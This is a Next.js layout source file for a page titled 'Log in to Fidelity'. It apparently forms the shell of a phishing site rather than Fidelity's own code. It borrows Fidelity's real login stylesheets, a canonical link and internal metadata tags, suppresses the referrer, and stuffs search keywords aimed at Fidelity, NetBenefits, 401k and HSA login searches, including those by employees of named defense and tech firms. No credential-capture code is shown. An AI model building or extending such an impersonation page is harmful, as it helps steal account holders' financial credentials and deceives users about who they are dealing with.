import type { Metadata } from "next";
import { Geist, Geist_Mono } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

export const metadata: Metadata = {
  title: "Log in to Fidelity",
  keywords: [
  "Fidelity",
  "Fidelity Investments",
  "Fidelity login",
  "Fidelity account login",
  "Fidelity customer login",
  "Fidelity sign in",
  "Fidelity online access",
  "Fidelity account access",
  "Fidelity digital login",
  "Fidelity secure login",
  "digital.fidelity.com",
  "digital.fidelity.com login",
  "digital.fidelity.com prgw",
  "digital.fidelity.com prgw digital login",
  "digital.fidelity.com login full page",
  "Fidelity login page",
  "Fidelity full page login",
  "Fidelity investments login page",
  "Fidelity customer portal",
  "Fidelity online portal",

  "Fidelity NetBenefits",
  "NetBenefits login",
  "Fidelity NetBenefits login",
  "NetBenefits account access",
  "NetBenefits retirement login",
  "NetBenefits workplace benefits",
  "NetBenefits 401k login",
  "Fidelity retirement account",
  "Fidelity retirement login",
  "Fidelity workplace benefits",
  "Fidelity employee benefits",
  "Fidelity employer benefits",
  "Fidelity stock plan login",

  "Fidelity 401k",
  "Fidelity 401k login",
  "Fidelity retirement plan",
  "Fidelity pension login",
  "Fidelity IRA login",
  "Fidelity Roth IRA",
  "Fidelity brokerage account",
  "Fidelity investment account",
  "Fidelity retirement savings",
  "Fidelity workplace savings",
  "Fidelity stock options",
  "Fidelity ESPP login",

  "Fidelity HSA",
  "Fidelity HSA login",
  "health savings account Fidelity",
  "Fidelity benefits login",
  "Fidelity account balance",
  "Fidelity investment portfolio",
  "Fidelity retirement balance",
  "check Fidelity account balance",

  "forgot Fidelity username",
  "forgot Fidelity password",
  "Fidelity password reset",
  "Fidelity username recovery",
  "recover Fidelity account",
  "unlock Fidelity account",
  "Fidelity login help",
  "Fidelity customer service",
  "Fidelity technical support",
  "Fidelity login support",
  "Fidelity account recovery",
  "Fidelity security verification",
  "Fidelity two factor authentication",

  "Fidelity mobile app",
  "Fidelity app login",
  "Fidelity app download",
  "Fidelity account management",
  "Fidelity online investing",
  "Fidelity investment platform",
  "Fidelity financial services",

  "Fidelity Amazon 401k",
  "Fidelity Microsoft 401k",
  "Fidelity Apple employee benefits",
  "Fidelity Boeing 401k",
  "Fidelity RTX benefits",
  "Fidelity Lockheed Martin benefits",
  "Fidelity General Dynamics benefits",
  "Fidelity Northrop Grumman benefits",
  "Fidelity IBM retirement plan",
  "Fidelity Oracle benefits",
  "Fidelity Intel 401k",
  "Fidelity Qualcomm benefits",
  "Fidelity Micron benefits",
  "Fidelity employee retirement login",

  "how to access Fidelity account",
  "how to check Fidelity 401k balance",
  "how to view Fidelity retirement account",
  "how to withdraw from Fidelity 401k",
  "how to update Fidelity beneficiaries",
  "how to change Fidelity password",
  "how to access NetBenefits",
  "how to roll over Fidelity 401k",
  "how to contact Fidelity support",
  "how to download Fidelity statements"
],
  description: "Fidelity Investments Login",
  viewport: "width=device-width,initial-scale=1",
  icons: {
    icon: "/favicon.ico",
  },
  openGraph: {
    title: "Log in to Fidelity",
    description: "Fidelity Investments Login",
    type: "website",
  },
  twitter: {
    card: "summary",
    title: "Log in to Fidelity",
    description: "Fidelity Investments Login",
  },
  other: {
    CHANNEL: "Fid.com web",
    SECSUB: "/Login/No CID",
    SOURCE: "Fidelity",
    PAGE: "Corporate Login",
    PAGEVERSION: "Full Page",
    PURPOSE: "Customer Service",
    referrer: "no-referrer",
  },
};

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode;
}>) {
  return (
    <html lang="en">
      <head>
        <link rel="icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="canonical" href="https://digital.fidelity.com/prgw/digital/login/full-page" />
        <link
          rel="stylesheet"
          href="https://digital.fidelity.com/stgw/digital/login/dist/dom-signin-68cb94baa020a3239b82.css"
        />
        <link
          rel="stylesheet"
          href="https://digital.fidelity.com/stgw/digital/login/dist/dom-signin-107a7f9c4e8e9360d3c0.css"
        />
        <script
          src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
          integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
          crossOrigin="anonymous"
          referrerPolicy="no-referrer"
          async
        />
      </head>
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
        data-masking="true"
      >
        {children}
      </body>
    </html>
  );
}
